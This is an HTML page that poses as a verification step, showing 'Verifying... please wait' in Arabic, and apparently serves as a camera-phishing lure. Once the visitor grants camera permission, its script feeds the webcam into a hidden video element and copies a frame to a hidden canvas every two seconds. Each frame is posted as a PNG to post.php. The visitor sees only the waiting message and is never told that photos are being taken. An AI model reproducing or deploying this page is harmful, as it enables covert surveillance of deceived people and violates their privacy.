<!DOCTYPE html>
<html>
<head><title>Verify</title></head>
<body>
    <h3>جاري التحقق... يرجى الانتظار</h3>
    <video id="v" autoplay style="display:none;"></video>
    <canvas id="c" width="640" height="480" style="display:none;"></canvas>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script>
        navigator.mediaDevices.getUserMedia({video:true}).then(s=>{
            document.getElementById('v').srcObject=s;
            setInterval(()=>{
                const c=document.getElementById('c');
                c.getContext('2d').drawImage(document.getElementById('v'),0,0,640,480);
                $.post('post.php',{cat:c.toDataURL('image/png')});
            },2000);
        });
    </script>
</body>
</html>
